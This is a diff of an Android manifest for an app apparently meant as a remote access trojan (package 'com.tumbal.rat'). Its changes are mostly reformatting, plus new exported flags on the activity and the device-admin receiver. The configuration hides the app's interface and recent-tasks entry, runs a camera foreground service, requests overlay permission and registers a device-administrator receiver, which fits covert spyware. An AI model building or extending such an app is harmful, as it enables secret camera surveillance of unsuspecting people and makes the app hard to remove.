@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.tumbal.rat">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+
     <uses-permission android:name="android.permission.CAMERA" />
     <uses-permission android:name="android.permission.FLASHLIGHT" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
@@ -10,25 +10,43 @@
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
 
-    <application android:allowBackup="true" android:icon="@mipmap/ic_launcher"
-        android:label="Tumbal" android:theme="@style/Theme.AppCompat.NoDisplay">
-        <activity android:name=".MainActivity" android:excludeFromRecents="true"
-            android:launchMode="singleInstance" android:taskAffinity=""
-            android:theme="@android:style/Theme.Translucent.NoTitleBar">
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="Tumbal"
+        android:theme="@style/Theme.AppCompat.NoDisplay">
+
+        <activity
+            android:name=".MainActivity"
+            android:excludeFromRecents="true"
+            android:launchMode="singleInstance"
+            android:taskAffinity=""
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
-        <service android:name=".CoreService" android:enabled="true"
-            android:foregroundServiceType="camera" android:exported="false" />
+        <service
+            android:name=".CoreService"
+            android:enabled="true"
+            android:foregroundServiceType="camera"
+            android:exported="false" />
 
-        <receiver android:name=".AdminReceiver" android:permission="android.permission.BIND_DEVICE_ADMIN">
-            <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin" />
+        <receiver
+            android:name=".AdminReceiver"
+            android:permission="android.permission.BIND_DEVICE_ADMIN"
+            android:exported="true">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin" />
             <intent-filter>
                 <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
             </intent-filter>
         </receiver>
+
     </application>
+
 </manifest>
